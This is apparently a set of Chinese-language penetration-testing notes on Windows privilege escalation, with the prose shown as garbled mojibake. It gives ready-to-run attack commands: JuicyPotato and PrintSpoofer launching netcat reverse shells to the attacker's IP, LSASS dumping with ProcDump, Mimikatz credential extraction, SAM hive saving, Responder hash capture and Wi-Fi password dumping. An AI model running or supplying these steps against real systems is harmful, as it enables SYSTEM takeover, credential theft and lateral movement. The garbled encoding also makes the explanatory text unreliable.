# Windows Ê¨äÈôêÊèêÂçá

**üîç 1. Ë≥áË®äÊî∂ÈõÜ**

| Êåá‰ª§                                                                                                             | Ê™¢Êü•ÈªûÔºàÈÄ≤ÈöéÂßøÂã¢Ôºâ                                                                                                                                                                                                                                                                                                                      | Ëã•ÁôºÁèæÁõÆÊ®ô                                                         | ‰∏ã‰∏ÄÊ≠•Ë°åÂãï                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| -------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| <p></p><ol><li><mark style="color:red;">ÂàùÂßãÂ≠òÂèñÔºàExploit ÊºèÊ¥ûÊâìÈÄ≤Ê©üÂô®Ôºâ</mark></li></ol>                                  |                                                                                                                                                                                                                                                                                                                                |                                                               |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| `systeminfo`                                                                                                   |                                                                                                                                                                                                                                                                                                                                |                                                               | [#windows-kernel-exploits-nei-he-lou-dong-ti-quan](windows-quan-xian-ti-sheng.md#windows-kernel-exploits-nei-he-lou-dong-ti-quan "mention")                                                                                                                                                                                                                                                                                                                                                                                                                             |
| `wmic product get name`                                                                                        | ÊéÉÊèèÊáâÁî®Á®ãÂºèÊòØÂê¶Â≠òÂú®Âº±ÈªûÔºàÂ¶Ç Java 6„ÄÅFlash„ÄÅËÄÅÁâà 7-Zip„ÄÅTeamViewerÔºâ                                                                                                                                                                                                                                                                               | ÊòØ                                                             | Êü• CVEÔºåÊ∫ñÂÇôÁâπÂÆö Exploit ÊàñÂà©Áî® DLL Hijacking                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| ‰ΩøÁî® msfvenom ÁîüÊàêÊÉ°ÊÑè MSI ‰∏¶Âª∫Á´ãÂèçÂêëÈÄ£Á∑ö                                                                                   |                                                                                                                                                                                                                                                                                                                                |                                                               | [#zhong-du-gong-ji-sheng-chengeyi-msi-bing-jian-li-fan-xiang-lian-xian](windows-quan-xian-ti-sheng.md#zhong-du-gong-ji-sheng-chengeyi-msi-bing-jian-li-fan-xiang-lian-xian "mention")                                                                                                                                                                                                                                                                                                                                                                                   |
| <p></p><ol start="2"><li><mark style="color:red;">Ê¨äÈôêÊèêÂçáÔºàÊèêÂçáÁÇ∫ SYSTEM / AdministratorÔºâ</mark></li></ol>            |                                                                                                                                                                                                                                                                                                                                |                                                               |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| `whoami /priv`                                                                                                 | <mark style="color:red;">SeImpersonate</mark> / <mark style="color:red;">SeAssignPrimaryToken</mark> / <mark style="color:red;">SeDebugPrivilege</mark> /  <mark style="color:red;">SeTakeOwnershipPrivilege</mark> /<mark style="color:red;">SeBackupPrivilege</mark> /<mark style="color:red;">SeLoadDriverPrivilege</mark>  | Â≠òÂú®                                                            | [#seimpersonate-and-seassignprimarytoken-gong-ji](windows-quan-xian-ti-sheng.md#seimpersonate-and-seassignprimarytoken-gong-ji "mention")[#sedebugprivilege-quan-xian-ti-quan-gong-ji](windows-quan-xian-ti-sheng.md#sedebugprivilege-quan-xian-ti-quan-gong-ji "mention")[#setakeownership-quan-xian-lan-yong-gong-ji](windows-quan-xian-ti-sheng.md#setakeownership-quan-xian-lan-yong-gong-ji "mention")  [#print-operators-lie-yin-cao-zuo-yuan-quan-xian-li-yong](windows-quan-xian-ti-sheng.md#print-operators-lie-yin-cao-zuo-yuan-quan-xian-li-yong "mention")/ |
| `net local "Event Log Readers"`                                                                                | È°ØÁ§∫Ëá™Â∑±ÁöÑÂêçÂ≠ó                                                                                                                                                                                                                                                                                                                        |                                                               | [#event-log-readers-quan-xian-lan-yong-min-gan-ming-ling-xing-xie-qu-gong-ji](windows-quan-xian-ti-sheng.md#event-log-readers-quan-xian-lan-yong-min-gan-ming-ling-xing-xie-qu-gong-ji "mention")                                                                                                                                                                                                                                                                                                                                                                       |
| `Get-ADGroupMember -Identity DnsAdmins`                                                                        | È°ØÁ§∫Ëá™Â∑±ÁöÑÂêçÂ≠ó                                                                                                                                                                                                                                                                                                                        |                                                               | [#dnsadmins-quan-xian-lan-yong-gong-ji](windows-quan-xian-ti-sheng.md#dnsadmins-quan-xian-lan-yong-gong-ji "mention")                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| `Get-LocalGroupMember -Group "Hyper-V Administrators"`                                                         | È°ØÁ§∫Ëá™Â∑±ÁöÑÂêçÂ≠ó                                                                                                                                                                                                                                                                                                                        |                                                               | [#hyperv-administrators-quan-xian-li-yong](windows-quan-xian-ti-sheng.md#hyperv-administrators-quan-xian-li-yong "mention")                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| `REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA`          | <p><code>REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin</code><br></p>                                                                                                                                                                                   | <p>Â¶ÇÊûúÊòØ <code>0x2</code> Êàñ <code>0x0</code>ÔºåÊÅ≠ÂñúÔºåÈùûÂ∏∏ÂÆπÊòìÂà©Áî®ÔºÅ<br></p> | [#user-account-controluac-rao-guo](windows-quan-xian-ti-sheng.md#user-account-controluac-rao-guo "mention")                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| `.\SharpUp.exe audit`                                                                                          | Êâæ `Modifiable Service Binaries`„ÄÅ`Modifiable Services` Êàñ `Modifiable Registry Keys`                                                                                                                                                                                                                                             | ÊòØ                                                             | [#ruo-quan-xian-ti-quan-gong-ji](windows-quan-xian-ti-sheng.md#ruo-quan-xian-ti-quan-gong-ji "mention")                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| <p></p><ol start="3"><li><mark style="color:red;">ÊÜëË≠âÊì∑ÂèñÔºàDump SAM„ÄÅLSASS„ÄÅSecurity Hive Á≠âÔºâ</mark></li></ol>        |                                                                                                                                                                                                                                                                                                                                |                                                               |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| ÊÜëË≠âÁçµÊÆ∫                                                                                                           |                                                                                                                                                                                                                                                                                                                                |                                                               | [#ping-zheng-lie-sha](windows-quan-xian-ti-sheng.md#ping-zheng-lie-sha "mention")                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| `net localgroup "Event Log Readers"`                                                                           | ÊúâÂ∏≥ËôüÂ≠òÂú® -> ÂèØÁÑ°ÈúÄÊèêÊ¨äÊü•ÁúãÂÆâÂÖ®Êó•Ë™åÔºå‰æãÂ¶ÇÁôªÂÖ•‰∫ã‰ª∂4624                                                                                                                                                                                                                                                                                                | ÊòØ                                                             | ÂòóË©¶ËÆÄÂèñÂÆâÂÖ®Êó•Ë™åÔºåËßÄÂØüÈ´òÊ¨äÈôêÂ∏≥ËôüÊ¥ªÂãïÊàñÁôªÂÖ•‰æÜÊ∫ê                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| `findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml`                                                  | Âø´ÈÄüÊêúÂ∞ãÊïèÊÑüÊ™îÊ°àÔºåÈáùÂ∞ç config Ë®≠ÂÆö„ÄÅÂØÜÁ¢ºÂÇôË®ªÁ≠â                                                                                                                                                                                                                                                                                                    | ÊúâÂØÜÁ¢ºÈóúÈçµÂ≠ó                                                        | ÂòóË©¶ÁôªÂÖ• SMB„ÄÅRDP„ÄÅAD„ÄÅVPN Á≠âÂ§ñÈÉ®Ë≥áÊ∫ê                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| `gc 'C:\Users\<username>\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt'`                 | ‰ΩøÁî®ËÄÖËá™Ë®ÇË©ûÂÖ∏ÔºåÂ∏∏Áî®ÊñºËá™ÂÆöÁæ©ÊãºÂ≠óÔºåÂèØÁÇ∫ÂØÜÁ¢ºÂ≠óÂÖ∏‰æÜÊ∫ê                                                                                                                                                                                                                                                                                                      | ÊúâË©ûÂΩô                                                           | Êì¥ÂÖÖÂ≠óÂÖ∏ÈÄ≤Ë°åÊö¥ÂäõÁ†¥Ëß£ÊàñÁ§æÂ∑•Âè£‰ª§ÁµÑÂêà                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| `Get-ChildItem -Path C:\ -Recurse -Include unattend.xml,unattend.xml.bak -ErrorAction SilentlyContinue`        | ÊêúÂ∞ãÁ≥ªÁµ±Ëá™ÂãïÂåñÈÉ®ÁΩ≤Ê™îÔºåÂ∏∏Ë¶ãÊñº AD join ÊàñÊú¨Âú∞Â∏≥ËôüÈÖçÁΩÆ                                                                                                                                                                                                                                                                                                 | ÊúâÊ™îÊ°à                                                           | Ëß£ÊûêÊòéÊñáÂ∏≥ÂØÜÔºåÂü∑Ë°åÊú¨Âú∞ÊàñÊ©´ÂêëÁôªÂÖ•                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| `gc (Get-PSReadLineOption).HistorySavePath`                                                                    | PowerShell ‰ΩøÁî®Ê≠∑Âè≤ÔºåÊúÉÁïôÊúâÊÜëË≠â„ÄÅÂëΩ‰ª§„ÄÅIP Á≠âË°åÁÇ∫ÁóïË∑°                                                                                                                                                                                                                                                                                              | ÊúâÊïèÊÑüÂÖßÂÆπ                                                         | ÈáçË§áÂà©Áî®ÂëΩ‰ª§„ÄÅÊÜëË≠â„ÄÅÊúçÂãôÊåá‰ª§ÊßãÂª∫ lateral pivoting                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| `findstr /SI /M "password" *.txt *.ini *.cfg *.config *.xml`                                                   | Â§öÈªû‰ΩçÊéÉÊèèÁî®Êà∂Êñá‰ª∂Â§æËàáÂÇô‰ªΩ                                                                                                                                                                                                                                                                                                                  | ÊúâÂÖßÂÆπ                                                           | ÂòóË©¶ÁôªÂÖ•ÂÖ∂‰ªñÊúçÂãôÊàñÈõ≤Á´ØË≥áÊ∫ê                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| `Select-String -Path C:\Users\*\Documents\*.txt -Pattern "password"`                                           | Á≤æÊ∫ñÊêúÂ∞ã Documents ÂÖßÈÉ®Ê™îÊ°àÔºåÊúâËºÉÈ´òÂëΩ‰∏≠Áéá                                                                                                                                                                                                                                                                                                     | ÊúâÁôºÁèæ                                                           | ÂÅöÊÜëË≠âÁàÜÁ†¥ÊàñÊ©´ÂêëÁßªÂãïÊ∏¨Ë©¶                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| `%SYSTEMDRIVE%\pagefile.sys`                                                                                   | ‰∫§ÊèõË®òÊÜ∂È´îÊ™îÊ°àÔºåÂèØËÉΩ‰øùÊúâÊ≠∑Âè≤ÂØÜÁ¢º„ÄÅÊòéÊñáË≥áË®ä                                                                                                                                                                                                                                                                                                          | ÂèØÂèñÂæó                                                           | Áî® volatility ÂàÜÊûêË®òÊÜ∂È´îÔºåÊâæÂ∏≥ÂØÜÊàñ hash„ÄÅtoken Á≠âÊïèÊÑüË≥áË®ä                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| `cmdkey /list`                                                                                                 | Windows ÂÑ≤Â≠òÁöÑÊÜëË≠âÂø´ÂèñÔºåÂèØ‰æõ runas Ë™øÁî®                                                                                                                                                                                                                                                                                                    | ÊúâÊÜëË≠âÁ¥ÄÈåÑ                                                         | ‰ΩøÁî® `runas /savecred` ÈáçË§áÁôªÂÖ•ÔºåÈùúÈªò‰ΩøÁî®ÊÜëË≠âÊîªÊìä                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| `%WINDIR%\debug\NetSetup.log`                                                                                  | Windows AD Âä†ÂÖ•Ë®òÈåÑÔºåÂèØËÉΩÂê´Â∏≥ËôüÊàñÂª∫Á´ãËÄÖË≥áË®ä                                                                                                                                                                                                                                                                                                    | ÂèØË¶ã                                                            | Êé®‰º∞ AD ÁÆ°ÁêÜËÄÖË°åÁÇ∫„ÄÅÊâæÈÄöÁî®ÊÜëË≠âÁ∑öÁ¥¢                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| `%WINDIR%\system32\config\security.sav`                                                                        | ÂÇô‰ªΩÁôªÈåÑÊ™îÔºåÂê´ÂÆâÂÖ®ÊÄßÁ≠ñÁï•ËàáÊ¨äÈôêË≥áË®ä                                                                                                                                                                                                                                                                                                              | ÂèØÂèñÂæó                                                           | ÂÅöÈõ¢Á∑ö Registry ÂàÜÊûêÔºåÊâæ SID / ACL ÊàñÊ¨äÈôêË®≠ÂÆö                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| <p></p><ol start="4"><li><mark style="color:red;">ÂØÜÁ¢ºÁ†¥Ëß£ÔºàHashcat / John Á≠âÈõ¢Á∑öÊîªÊìäÔºâ</mark></li></ol>                  |                                                                                                                                                                                                                                                                                                                                |                                                               |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| `C:\ProgramData\Configs*`                                                                                      | Â∏∏Áî®ÁÇ∫Ëá™Ë®ÇËªüÈ´îÁöÑÂÑ≤Â≠ò‰ΩçÁΩÆÔºåÂê´ÊòéÊñáÂ∏≥ÂØÜÊàñ token                                                                                                                                                                                                                                                                                                      | ÊúâË®≠ÂÆöÊ™î                                                          | Â∞ãÊâæÂ∏≥ÂØÜË®≠ÂÆöÊàñÂÇô‰ªΩÔºåÊ©´ÂêëÊîªÊìäÊñ∞ÁõÆÊ®ô                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| `sudo responder -wrf -v -I tun0`                                                                               | ÊçïÁç≤ NTLM HashÔºöÂ¶Ç SMB Relay„ÄÅWPAD„ÄÅHTTP Âü∫Êñº LAN ÊîîÊà™                                                                                                                                                                                                                                                                                   | ÂèñÂæó hash                                                       | ‰ΩøÁî® hashcat / john Á†¥Ëß£Êàñ pass-the-hash Âà©Áî®                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| `%USERPROFILE%\ntuser.dat`                                                                                     | ‰ΩøÁî®ËÄÖË°åÁÇ∫ÂàÜÊûêÁôªÈåÑÊ™îÔºåÂèØÂê´Ëá™ÂãïÁôªÂÖ•Â∏≥ÂØÜ„ÄÅËá™ÂãïÂïüÂãïÈ†ÖÁ≠â                                                                                                                                                                                                                                                                                                     | ÂèØÂèñ                                                            | ÂàÜÊûê‰ΩøÁî®ËÄÖË°åÁÇ∫Á¥ÄÈåÑËàáÊÜëË≠âÁóïË∑°„ÄÅPersist ÊßãÂª∫‰æùÊìö                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| <p></p><ol start="5"><li><mark style="color:red;">üëâ„ÄêÊ©´ÂêëÁßªÂãï„ÄëÔºö‰ΩøÁî®Êì∑ÂèñÁöÑÊÜëË≠âÂéªÁôªÂÖ•Âà•ÁöÑ‰∏ªÊ©üÔºàRDP„ÄÅSMB„ÄÅWMI„ÄÅPsexecÔºâ</mark></li></ol> |                                                                                                                                                                                                                                                                                                                                |                                                               |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| <p>Â¶ÇÊûúÂèØ‰ª•‰ΩøÁî®admin ÈñãÂïücmd.exe</p><p></p><p>reg save HKLM\SAM C:\sam.save </p>                                       | ÊàêÂäü                                                                                                                                                                                                                                                                                                                             |                                                               | SAM ÊîªÊìä                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| <p></p><ol start="6"><li><mark style="color:red;">Ê©üÂØÜÊèêÂèñ / ÊéßÂà∂Ê¨äÂ•™Âèñ / ÊîªÊìäÊ©´ÂêëÊì¥Âºµ</mark></li></ol>                       |                                                                                                                                                                                                                                                                                                                                |                                                               |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| `net use`                                                                                                      | ÂàóÂá∫Á∂≤Ë∑ØÁ£ÅÁ¢üÊéõËºâ„ÄÅÊÜëË≠âÁ∂ÅÂÆö„ÄÅAD ‰ΩøÁî®Á¥ÄÈåÑ                                                                                                                                                                                                                                                                                                          | ÊúâÁ£ÅÁ¢üÊéõËºâ                                                         | ÊéÉÊèèÂÖ±Áî®Ë≥áÊñôÂ§æÊâæÊÜëË≠â„ÄÅÂÖßÈÉ®Ë≥áÊ∫êËàá Payload ÊîæÁΩÆÈªû                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| `netsh wlan show profile`                                                                                      | Ê™¢Êü•ÁÑ°Á∑öÁ∂≤Ë∑ØÊ∏ÖÂñÆ                                                                                                                                                                                                                                                                                                                       | Êúâ Wi-Fi Ë®≠ÂÆöÊ™î                                                   | ‰∏ã‰∏ÄÊ≠•‰ΩøÁî® key=clear ÂèñÂá∫ÂØÜÁ¢º                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| `netsh wlan show profile <ProfileName> key=clear`                                                              | È°ØÁ§∫ÊòéÊñá Wi-Fi ÂØÜÁ¢º                                                                                                                                                                                                                                                                                                                  | ÂØÜÁ¢ºÂá∫Áèæ                                                          | ÈÄ≤Ë°åÁÑ°Á∑öÁ∂≤Ë∑ØÊª≤ÈÄèÔºàÁÑ°Á∑ö‰∏≠Áπº„ÄÅÂÅΩ AP ÊîªÊìäÔºâ                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |

## **üöÄ 2.** Ê¨äÈôêÊèêÂçá

<details>

<summary>SeImpersonate and SeAssignPrimaryToken ÊîªÊìä</summary>

### üè¢ ÂÖ¨Âè∏ÂåñÊØîÂñª

* SeImpersonatePrivilege = „ÄåËá®ÊôÇÊâÆ CEO Ë∫´‰ªΩË≠â üï¥Ô∏è„Äç
* SeAssignPrimaryTokenPrivilege = „ÄåÂèØ‰ª•Âπ´Âà•‰∫∫Áôº CEO Âç∞Á´† ü™™„Äç
* ÊîªÊìäËÄÖÂè™Ë¶ÅÊúâÈÄôÊ¨äÈôêÔºåÂ∞±ÂèØ‰ª•ÈñãÂÄãÂÅáÁ™óÂè£ÔºàPipeÔºâÁ≠â CEOÔºàSYSTEMÔºâËá™Â∑±‰∏äÈñÄÈÄÅÊ¨äÈôêÂç∞Á´†ÔºÅ

### ÊîªÊìäÊµÅÁ®ãÁ∏ΩË¶ΩÂúñ

```
[1Ô∏è‚É£ Â∑≤Êª≤ÈÄè‰ΩéÊ¨äÈôê (Service Account)]  
     ‚îÇ  
     ‚Üì  
[2Ô∏è‚É£ Âü∑Ë°å whoami /priv Á¢∫Ë™çÊúâ SeImpersonate / SeAssignPrimaryToken]  
     ‚îÇ  
     ‚Üì  
[3Ô∏è‚É£ Âà©Áî®Â∑•ÂÖ∑Âª∫Á´ã COM PipeÔºàÈá£ SYSTEMÔºâ  
     ‚îÇ  
     ‚Üì  
[4Ô∏è‚É£ SYSTEM ÈÄ£Á∑ö & token Ê¥©Èú≤  
     ‚îÇ  
     ‚Üì  
[5Ô∏è‚É£ Â∑•ÂÖ∑ÊçïÁç≤ SYSTEM token  
     ‚îÇ  
     ‚Üì  
[6Ô∏è‚É£ ÈÄèÈÅé token ÊâìÈñã SYSTEM shell  
     ‚îÇ  
     ‚Üì  
[7Ô∏è‚É£ ÊàêÂäüÂèñÂæó SYSTEM Ê¨äÈôê  
     ‚îÇ  
     ‚Üì  
[8Ô∏è‚É£ Ê©´ÂêëÁßªÂãï / Dump Hash / ÊéßÂà∂ÂüüÊéß]  
```

***

### üßë‚Äçüíª **ÊîªÊìäÊåá‰ª§Ê®°ÊùøÔºö**

**Á¨¨‰∏ÄÊ≠•**

```cmd
 whoami /priv
```

#### Á¨¨‰∫åÈÉ® --> ÈÅ∏ÊìáÂÖ∂‰∏≠‰∏ÄÁ®ÆÊîªÊìäÊñπÊ≥ï **JuicyPotato /  PrintSpoofer (Ë´ã‰ΩøÁî®Êñá‰ª∂‰∏äÂÇ≥)**

#### ‚úÖ üî∏ **JuicyPotatoÔºàÈÅ©Áî® Windows Server 2016 / Win10 1803 ‰ª•‰∏ãÔºâ**

```bash
JuicyPotato.exe -l 5555 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe <‰Ω†ÁöÑIP> <‰Ω†ÁöÑPORT> -e cmd.exe" -t *
```

| ÂèÉÊï∏    | Áî®ÈÄî                                                    |
| ----- | ----------------------------------------------------- |
| -l    | Êú¨Âú∞ÂÅΩ COM Èá£È≠öÁ´ØÂè£ (ÂèØËá™Ë®ÇÔºå‰æãÂ¶Ç 5555)                            |
| -p    | Ë¶ÅÁî® SYSTEM Ê¨äÈôêÂü∑Ë°åÂòÖÁ®ãÂºè (Âª∫Ë≠∞ c:\windows\system32\cmd.exe)    |
| -a    | Áµ¶Âü∑Ë°åÊ™îÂÇ≥ÈÅûÁöÑÂèÉÊï∏ÔºàÂèçÂΩà shell ÂëΩ‰ª§Ôºâ                                |
| -t \* | ÂêåÊôÇÊ∏¨Ë©¶ CreateProcessWithTokenW Âêå CreateProcessAsUser Ê®°Âºè |

***

#### ‚úÖ üî∏ **PrintSpooferÔºàÈÅ©Áî® Windows 10 1809+ / Server 2019+Ôºâ**

```bash
PrintSpoofer.exe -c "c:\tools\nc.exe <‰Ω†ÁöÑIP> <‰Ω†ÁöÑPORT> -e cmd.exe"
```

| ÂèÉÊï∏ | Áî®ÈÄî                           |
| -- | ---------------------------- |
| -c | Áî® SYSTEM Ê¨äÈôêÂü∑Ë°åÂëΩ‰ª§ÔºàÂèçÂΩà shell Êåá‰ª§Ôºâ |

***

### üîé **Âú®Êú¨Ê©üÁõ£ËÅΩÔºö**

```bash
nc -lvnp <‰Ω†ÁöÑPORT>
```

Áï∂ÂèçÂΩàÊàêÂäüÔºå‰Ω†ÊúÉË¶ãÂà∞Ôºö

```
connect to [‰Ω†ÁöÑIP] from (ÁõÆÊ®ôÊ©üIP)
Microsoft Windows [Version ...]
C:\Windows\system32> whoami
nt authority\system
```

***

### üö¶ **ÊèêÁ§∫Ôºö**

| Áí∞Â¢É                             | Êé®Ëñ¶Â∑•ÂÖ∑                       |
| ------------------------------ | -------------------------- |
| Windows 10 / Server 2019 ‰ª•‰∏ã    | JuicyPotato                |
| Windows 10 1809 / Server 2019+ | PrintSpoofer / RoguePotato |

***

</details>

<details>

<summary>SeDebugPrivilege Ê¨äÈôêÊèêÊ¨äÊîªÊìä</summary>

### üéØ SeDebugPrivilege Ê¶ÇÂøµ

**SeDebugPrivilege** = ÂÖ¨Âè∏ÂÖ•Èù¢ **„ÄåË∂ÖÁ¥öÂÖßÊéßÁ®ΩÊ†∏Âì° üéØüïµÔ∏è‚Äç‚ôÇÔ∏è„Äç**

* Êú¨Ë≥™ÔºöÊìÅÊúâÊ™¢Êü•„ÄÅÊìçÊéßÁ≥ªÁµ±‰ªª‰ΩïÈÄ≤Á®ãÂòÖÊ¨äÈôê
* ÊØîÂñªÔºö\
  ‰Ω†Âîî‰∏ÄÂÆö‰øÇ CEOÔºàÁ≥ªÁµ±ÁÆ°ÁêÜÂì°ÔºâÔºå‰ΩÜ‰Ω†‰øÇÁâπÂà•ÊéàÊ¨äÂòÖ„ÄåÂØ©Ë®àÂ∞àÂì°„ÄçÔºå\
  ÂèØ‰ª•Èö®ÊôÇÊâìÈñãËÄÅÈóÜÊàøÈñì„ÄÅÊäÑÂØ´ÂÖßÈÉ®Êñá‰ª∂ÔºàÂ≠òÂèñÂÖ∂‰ªñÈÄ≤Á®ãË®òÊÜ∂È´îÔºâ

***

### üî• ÊîªÊìäÁî®ÈÄî

| Âà©Áî®ÊñπÂºè       | ÂÖ¨Âè∏ÂåñÊØîÂñª üè¢                                |
| ---------- | --------------------------------------- |
| Dump LSASS | ÂÅ∑Ëµ∞Á≥ªÁµ±Ë®òÊÜ∂È´î‰∏≠ÊâÄÊúâÂ∏≥ËôüÂØÜÁ¢ºÔºàÁøªÈñãËÄÅÈóÜ‰øùÈö™ÁÆ±ÊäÑË≥áÊñô üìÇÔºâ           |
| ÊèêÊ¨äÁÇ∫ SYSTEM | ÂÅΩË£ùÊàê SYSTEM ÔºåÁî®„ÄåË™øÁî®‰∏äÂè∏ÁöÑÁ∞ΩÂêçÂç∞Á´†„ÄçÊâìÈñã SYSTEM shell |
| ÈáùÂ∞çÁâπÂÆöÈÄ≤Á®ãÈÄ≤Ë°åÊ≥®ÂÖ• | ‰øÆÊîπÁ≥ªÁµ±Ë°åÁÇ∫ÔºàÈÄ≤Á®ãË®òÊÜ∂È´îÂÖßÊîπË≥áÊñôÔºåÁ≠âÊñºÁ´ÑÊîπÊñá‰ª∂ ‚úèÔ∏èÔºâ             |

***

### ‚úÖ ÊîªÊìäÊµÅÁ®ãÂúñ

```
[1Ô∏è‚É£ ÊìÅÊúâ SeDebugPrivilege Â∏≥Êà∂]  
     ‚îÇ  
     ‚Üì  
[2Ô∏è‚É£ whoami /priv Ê™¢Êü•Á¢∫Ë™çÊ¨äÈôê]  
     ‚îÇ  
     ‚Üì  
[3Ô∏è‚É£ Dump LSASS Ë®òÊÜ∂È´î (ProcDump / TaskMgr)]  
     ‚îÇ  
     ‚Üì  
[4Ô∏è‚É£ Â∞á dump Ê™îÊê¨ÂõûÊú¨Ê©ü]  
     ‚îÇ  
     ‚Üì  
[5Ô∏è‚É£ Áî® Mimikatz sekurlsa::minidump ÂàÜÊûê]  
     ‚îÇ  
     ‚Üì  
[6Ô∏è‚É£ ÊãøÂà∞ NTLM hash / ÊòéÊñáÂØÜÁ¢º]  
     ‚îÇ  
     ‚Üì  
[7Ô∏è‚É£ Ê©´ÂêëÁßªÂãï (PTH / ÁôªÂÖ•ÂÖ∂‰ªñ‰∏ªÊ©ü)]  
```

***

### üõ†Ô∏è ÊîªÊìäÊåá‰ª§ÁØÑ‰æã

#### ‚úÖ 1Ô∏è‚É£ Áî® **ProcDump** dump LSASS (‰ΩøÁî®Êñá‰ª∂‰∏äÂÇ≥ÊîªÊìä)

```cmd
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

\| -ma | ‰ª£Ë°® Full memory dump ÔºàÂåÖÂê´ÊâÄÊúâÊïèÊÑüË≥áË®äÔºâ |

***

#### ‚úÖ 2Ô∏è‚É£&#x20;

* Èö®ÂæåÔºåÂ≠∏ÁîüÈúÄË¶ÅÂ∞á `lsass.dmp` Ê™îÊ°àË§áË£ΩÂà∞ `C:\Tools\Mimikatz\x64` ÔºåÂ∞éËà™Âà∞Âêå‰∏ÄÁõÆÈåÑÔºåÁÑ∂ÂæåÂü∑Ë°å `mimikatz.exe` Ôºö

```cmd
copy lsass.dmp C:\Tools\Mimikatz\x64\
cd C:\Tools\Mimikatz\x64\
mimikatz.exe
```

***

#### ‚úÖ 3Ô∏è‚É£ ‰ΩøÁî® **Mimikatz** ËÆÄÂèñ LSASS Dump (Mimikatz ‰ΩøÁî®Êñá‰ª∂‰∏äÂÇ≥)

```cmd
mimikatz.exe
```

ÁÑ∂ÂæåÂü∑Ë°åÔºö

```mimikatz
log
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

‚û° Âç≥ÂèØÂèñÂæóÂØÜÁ¢º / NTLM Hash / ÁôªÂÖ• session

***

</details>

<details>

<summary>SeTakeOwnership Ê¨äÈôêÊø´Áî®ÊîªÊìä</summary>



### üè¢ ÂÖ¨Âè∏ÂåñÊ¶ÇÂøµ

* **SeTakeOwnershipPrivilege** = „ÄåÂÖ¨Âè∏ÂÖßÈÉ®Ë≥áÁî¢ÂèØÂº∑Âà∂Êé•ÁÆ°Ê¨ä ü™™„Äç
* ‰Ω†Âîî‰∏ÄÂÆö‰øÇËÄÅÁ¥∞Ôºå‰ΩÜÁç≤ÂæóÂíó„ÄåÂèØ‰ª•Âº∑Ë°åÊê∂ÈÅéÂÖ∂‰ªñÈÉ®ÈñÄÊñá‰ª∂Ê´ÉÊìÅÊúâÊ¨ä„ÄçÂòÖÊ¨äÂà©Ôºõ
* ÁÑ∂Âæå‰Ω†Â∞±ÂèØ‰ª•ÊâìÈñãÂéüÊú¨ÁÑ°Ê≥ïÈñãÂïüÁöÑÂØÜÁ¢ºÁÆ±„ÄÅË®≠ÂÆöÊñá‰ª∂„ÄÅÊ©üÂØÜÁõÆÈåÑ„ÄÇ

***

### üöÄ ÊîªÊìäÊµÅÁ®ãÂúñ

```
1Ô∏è‚É£ Áç≤Âæó Service / ÁâπÊ¨äÁî®Êà∂ÔºàÊúâ SeTakeOwnershipPrivilegeÔºâ]  
     ‚îÇ  
     ‚Üì  
[2Ô∏è‚É£ ÊâæÁõÆÊ®ôÊ™îÊ°àÔºà‰æãÂ¶Ç cred.txt / web.config / KeePass Ê™îÊ°àÔºâ]  
     ‚îÇ  
     ‚Üì  
[3Ô∏è‚É£ ‰ΩøÁî® takeown ÊîπËÆäË©≤Ê™îÊ°àÊâÄÊúâÊ¨ä ü™™]  
     ‚îÇ  
     ‚Üì  
[4Ô∏è‚É£ ‰øÆÊîπ ACL Ê¨äÈôê (icacls) ‚Üí Áµ¶Ëá™Â∑± Full Control]  
     ‚îÇ  
     ‚Üì  
[5Ô∏è‚É£ ËÆÄÂèñÊïèÊÑüË≥áË®äÔºàÂ∏≥ÂØÜ / ÂØÜÈë∞ / ÊÜëË≠âÔºâüìÇ]  
     ‚îÇ  
     ‚Üì  
[6Ô∏è‚É£ Âà©Áî®Â∏≥ÂØÜ / hash ÈÄ≤Ë°åÊ©´ÂêëÁßªÂãï / ÊèêÊ¨ä üîì]
```

***

